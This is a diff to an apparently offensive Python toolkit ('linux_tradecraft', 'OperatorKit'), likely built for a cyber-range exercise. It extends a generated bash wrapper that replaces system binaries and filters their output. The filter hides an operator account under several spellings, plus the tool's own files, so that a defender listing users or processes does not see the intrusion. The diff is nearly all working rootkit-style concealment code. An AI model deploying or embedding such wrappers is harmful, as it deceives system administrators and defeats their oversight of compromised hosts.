@@ -494,8 +494,30 @@ def linux_tradecraft(action, opts):
             "#!/bin/bash\n"
             "# RANGE-VEIL\n"
             "orig={{real}}\n"
+            "account={acct}\n"
             "if [ ! -f \"$orig\" ] || [ -L \"$orig\" ] || grep -q RANGE-VEIL \"$orig\" 2>/dev/null; then echo BROKEN; exit 1; fi\n"
-            "\"$orig\" {{numeric}}\"$@\" | grep -v -F {flags} || true\n"
+            "account_forms() {{\n"
+            "  name=$1\n"
+            "  canon=$(getent passwd \"$name\" 2>/dev/null | awk -F: 'NR==1 {{ print $1 }}')\n"
+            "  if [ -n \"$canon\" ]; then name=$canon; fi\n"
+            "  printf '%s\\n' \"$name\"\n"
+            "  low=$(printf '%s' \"$name\" | tr 'A-Z' 'a-z')\n"
+            "  if [ \"$low\" != \"$name\" ]; then printf '%s\\n' \"$low\"; fi\n"
+            "  saved=$IFS\n"
+            "  IFS=.\n"
+            "  for part in $name; do\n"
+            "    if [ \"${{#part}}\" -ge 4 ]; then printf '%s\\n' \"$part\"; fi\n"
+            "  done\n"
+            "  IFS=$saved\n"
+            "  n=${{#name}}\n"
+            "  if [ \"$n\" -gt 7 ]; then printf '%s\\n' \"${{name:0:7}}\"; fi\n"
+            "  if [ \"$n\" -gt 8 ]; then printf '%s\\n' \"${{name:0:7}}+\" \"${{name:0:8}}\"; fi\n"
+            "}}\n"
+            "if [ -n \"$account\" ] && [ \"$account\" != mail ] && [ \"$account\" != defender ]; then\n"
+            "  \"$orig\" {{numeric}}\"$@\" | grep -v -F -f <(account_forms \"$account\") {flags} || true\n"
+            "else\n"
+            "  \"$orig\" {{numeric}}\"$@\" | grep -v -F {flags} || true\n"
+            "fi\n"
             "EOF\n"
             "  sed -i \"s#{{real}}#$hold/$name.orig#\" \"$real\"\n"
             "  sed -i \"s#{{numeric}}#$numeric#\" \"$real\"\n"
@@ -509,6 +531,7 @@ def linux_tradecraft(action, opts):
             holdroot=shell_quote(HOLD),
             real="{real}",
             flags=flags,
+            acct=shell_quote("" if (opts.get("account") or "") in ("mail", "defender") else (opts.get("account") or "")),
         )
     if action == "unveil":
         return root_guard() + (
@@ -746,8 +769,6 @@ class OperatorKit(object):
         for name in (account, user):
             if name and name not in ("defender", "mail"):
                 patterns.append(name)
-                if len(name) > 8:
-                    patterns.append(name[:7] + "+")
         patterns.append("range.py")
         patterns.append("update_notifier.py")
         patterns.append("/var/lib/.hold")
